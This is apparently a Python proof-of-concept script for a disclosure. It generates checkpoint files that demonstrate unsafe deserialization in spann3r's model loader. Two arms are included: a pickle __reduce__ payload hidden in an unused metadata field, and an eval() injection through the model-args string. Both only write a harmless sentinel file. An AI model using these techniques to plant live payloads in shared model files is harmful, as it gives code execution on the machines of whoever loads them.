# Generate the .pth checkpoint samples used to reproduce the unsafe-deserialization
# vulnerability in HengyiWang/spann3r @ f89d6a23a842 (dust3r/model.py, load_model).
#
# Samples (all payloads are benign sentinels: they only create a small text file
# in the current working directory - no network, no destructive action):
#   samples/benign.pth       negative control - same structure, no attack fields
#   samples/pickle_arm.pth   pickle object graph carries a __reduce__ payload;
#                            it fires inside torch.load() at dust3r/model.py:35,
#                            BEFORE ckpt['args'] is ever read at model.py:36
#   samples/eval_arm.pth     ckpt['args'].model is a crafted string that is
#                            passed through eval() at dust3r/model.py:47
#
# Every sample carries the same full random-weight state dict (seeded, so the
# files are byte-for-byte reproducible), i.e. the same "weights + args" layout
# as a real spann3r checkpoint, just with a scaled-down encoder/decoder for
# construction speed.
#
# Usage: python poc/make_poc.py            (writes ./samples/)
import argparse
import hashlib
import pathlib
import sys

import torch

REPO_DIR = pathlib.Path(__file__).resolve().parents[1] / "spann3r-f89d6a23"
sys.path.insert(0, str(REPO_DIR))

# 'args.model' string in the same kwarg layout a real spann3r checkpoint carries
# (production checkpoints use the same shape with enc_depth=24, enc_dim=1024)
REPO_MODEL_STR = ("AsymmetricCroCo3DStereo(pos_embed='RoPE100',"
                  "patch_embed_cls='PatchEmbedDust3R',"
                  "enc_depth=4,enc_embed_dim=384,enc_num_heads=6,"
                  "dec_depth=2,dec_embed_dim=192,dec_num_heads=3,"
                  "img_size=(512,512,8),landscape_only=False)")

# eval-arm payload: tuple trick - the write_text() runs first, the tuple then
# evaluates to a genuine model class so the load itself still completes.
# Must stay free of spaces: dust3r/model.py:40 strips spaces from the string.
EVAL_PAYLOAD = (
    "(__import__('pathlib').Path('pwned_eval_arm.txt')"
    ".write_text('eval-arm-code-execution-at-dust3r/model.py:47'),"
    + REPO_MODEL_STR + ")[1]"
)


class PickleSentinel:
    """__reduce__ payload that runs while torch.load() unpickles the file."""

    def __reduce__(self):
        return (
            pathlib.Path.write_text,
            (pathlib.Path("pwned_pickle_arm.txt"),
             "pickle-arm code execution at dust3r/model.py:35 (torch.load)"),
        )


def build_state_dict():
    """Random-weight state dict so the sample looks like a real checkpoint."""
    from dust3r.model import AsymmetricCroCo3DStereo
    torch.manual_seed(0)
    net = eval(REPO_MODEL_STR)  # same string that goes into ckpt['args'].model
    return {k: v.detach().clone() for k, v in net.state_dict().items()}


def sha256(path):
    h = hashlib.sha256()
    with path.open("rb") as f:
        for chunk in iter(lambda: f.read(1 << 20), b""):
            h.update(chunk)
    return h.hexdigest()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--out", default="samples")
    cli = ap.parse_args()
    out = pathlib.Path(cli.out)
    out.mkdir(parents=True, exist_ok=True)

    state = build_state_dict()
    print(f"state dict: {len(state)} tensors")

    samples = {
        # negative control: exactly the structure of a real spann3r checkpoint,
        # no attack fields anywhere
        "benign.pth": {
            "args": argparse.Namespace(model=REPO_MODEL_STR),
            "model": state,
        },
        # eval arm: ONLY the args.model string differs from the control
        "eval_arm.pth": {
            "args": argparse.Namespace(model=EVAL_PAYLOAD),
            "model": state,
        },
        # pickle arm: args.model is the benign string again; the payload hides
        # in an unused part of the object graph and fires during torch.load()
        "pickle_arm.pth": {
            "args": argparse.Namespace(model=REPO_MODEL_STR),
            "model": state,
            "meta": {"created_by": PickleSentinel()},
        },
    }

    for name, obj in samples.items():
        path = out / name
        torch.save(obj, path)
        print(f"wrote {path}  ({path.stat().st_size} bytes)")
        print(f"  sha256 {sha256(path)}")

    sums = out / "SHA256SUMS.txt"
    sums.write_text("\n".join(f"{sha256(out / n)}  {n}" for n in samples) + "\n",
                    encoding="utf-8")
    print(f"wrote {sums}")


if __name__ == "__main__":
    main()
